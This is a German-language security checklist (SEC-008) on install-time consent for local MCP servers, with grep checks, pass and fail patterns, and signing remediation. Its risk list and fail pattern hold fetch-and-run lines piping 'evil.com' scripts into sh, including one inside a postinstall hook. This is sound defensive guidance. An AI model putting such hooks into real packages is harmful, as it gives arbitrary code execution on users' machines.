# SEC-008 — Pre-Configuration Consent

## Description

Wenn ein User einen lokalen MCP-Server installiert (typischerweise via `claude_desktop_config.json`), wird ein Subprozess mit User-Privilegien gestartet. Der Befehl steht in der Konfig-Datei — `npx -y @malkreide/zh-education-mcp`, `uvx zh-education-mcp`, etc.

Risiko: Die meisten User lesen Installations-Befehle nicht. Ein böswilliger Server-Maintainer könnte:

- Im Setup-Script `curl evil.com/payload | sh` verstecken
- Per `postinstall`-Hook in `package.json` Code ausführen
- Über `--unsafe-perm` als root installieren
- Native Bindings mit `gyp` kompilieren — beliebiger Code-Ausführung beim Build

Der Best-Practice-Standard verlangt vom **Server-Maintainer**:

1. **Transparenz**: README zeigt explizit den ungekürzten Installations-Befehl, ohne Hidden-Setup-Steps
2. **Auditierbarkeit**: Setup-Scripts (falls vorhanden) sind im Repo lesbar, kein dynamisches Code-Loading
3. **Dependency-Hygiene**: Keine `postinstall`/`preinstall`-Hooks, die externe Resources fetchen
4. **Signaturen**: Bei publizierten Paketen (npm, PyPI): Sigstore / npm-Signatures aktiv

Vom **Client/Host** (Claude Desktop) wird erwartet, dass die Installation eine Bestätigung verlangt — dieser Check prüft, dass der Server-Code so gestaltet ist, dass diese Bestätigung sinnvoll möglich ist.

## Verification

### Modus 1: code_review (keine versteckten Setup-Steps)

```bash
# Suche nach postinstall/preinstall-Hooks
grep -A2 -E '"(pre|post)install"' package.json

# Suche nach setup.py mit Code-Ausführung
grep -E 'install_requires|cmdclass' setup.py 2>/dev/null

# Suche nach pyproject.toml-Hooks
grep -E '\[tool\.setuptools\.cmdclass|\[project\.scripts\]' pyproject.toml
```

**Pass-Pattern:**

```toml
# pyproject.toml — keine custom commands, nur reguläre entry-points
[project.scripts]
zh-education-mcp = "zh_education_mcp.server:main"

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"
```

**Fail-Pattern:**

```json
{
  "scripts": {
    "postinstall": "curl https://evil.com/setup.sh | sh"
  }
}
```

### Modus 2: documentation_check (README zeigt vollen Befehl)

```bash
grep -B2 -A10 'claude_desktop_config\|mcpServers' README.md README.de.md
```

**Pass-Pattern:**

```markdown
## Installation

Add to `claude_desktop_config.json`:

\```json
{
  "mcpServers": {
    "zh-education": {
      "command": "uvx",
      "args": ["zh-education-mcp"]
    }
  }
}
\```

This runs the published PyPI package `zh-education-mcp` in an isolated
environment (uvx). The package source is at:
https://github.com/malkreide/zh-education-mcp

No setup scripts run beyond standard Python installation. See
[CONTRIBUTING.md](./CONTRIBUTING.md) for details on the build process.
```

### Modus 3: config_check (Package-Signing aktiv)

```bash
# PyPI: Sigstore-Signatur via OIDC-Trusted-Publisher
grep -rE 'pypi-publish|pypa/gh-action-pypi-publish' .github/workflows/

# npm: provenance attestations
grep -rE '--provenance|provenance.*true' .github/workflows/
```

**Pass-Pattern (PyPI mit Trusted Publisher):**

```yaml
# .github/workflows/release.yml
jobs:
  publish:
    environment: pypi
    permissions:
      id-token: write  # OIDC für Sigstore
    steps:
      - uses: pypa/gh-action-pypi-publish@release/v1
        # Keine API-Token nötig, OIDC-Trusted-Publisher mit Signatur
```

## Pass Criteria

- [ ] Keine `pre/postinstall`-Hooks, die externe Resources fetchen oder Code ausführen
- [ ] README zeigt vollen Installations-Befehl mit allen Argumenten transparent
- [ ] Setup-Scripts (falls vorhanden) sind im Repo lesbar, ohne dynamisches Code-Loading
- [ ] PyPI-Pakete: OIDC-Trusted-Publisher mit Sigstore-Signatur aktiv
- [ ] npm-Pakete: `--provenance`-Attestation aktiv
- [ ] CONTRIBUTING.md erklärt Build-Prozess für unabhängige Verifikation

## Common Failures

| Anti-Pattern | Risiko |
|---|---|
| `postinstall` mit `curl ... | sh` | Beliebige Code-Ausführung beim Install |
| Setup-Script lädt Pre-Compiled Binary von externer URL | Supply-Chain-Risiko ohne Audit-Trail |
| README versteckt Setup-Schritte hinter «one-liner.sh» | User können Befehl nicht prüfen |
| Kein Package-Signing | Typosquatting + MITM-Angriffe nicht erkennbar |
| `npm install` ohne `--ignore-scripts` empfohlen | Hooks laufen automatisch |

## Remediation

### Schritt 1: Hooks entfernen

```diff
  {
    "scripts": {
-     "postinstall": "node ./scripts/setup.js",
      "build": "tsc",
      "start": "node dist/server.js"
    }
  }
```

Falls Setup wirklich nötig ist: als separater, dokumentierter Schritt nach Installation, nicht automatisch.

### Schritt 2: README-Transparenz

Vollen Befehl mit Erklärung wie im Pass-Pattern. Kein Hide-Behind-One-Liner.

### Schritt 3: PyPI-Trusted-Publisher konfigurieren

Auf pypi.org → Project Settings → Publishing → Add trusted publisher mit GitHub-Repo.

```yaml
# .github/workflows/release.yml
on:
  push:
    tags: ['v*']

jobs:
  build-and-publish:
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-python@v6
      - run: pip install build && python -m build
      - uses: pypa/gh-action-pypi-publish@release/v1
        # Sigstore-Signaturen automatisch
```

### Schritt 4: User-seitige Empfehlung im README

```markdown
## Verification

This package is signed with Sigstore via PyPI Trusted Publishers.
You can verify the signature:

\```bash
pip install sigstore
sigstore verify identity \
  --cert-identity https://github.com/malkreide/zh-education-mcp/.github/workflows/release.yml@refs/tags/v0.1.0 \
  zh-education-mcp-0.1.0.tar.gz
\```
```
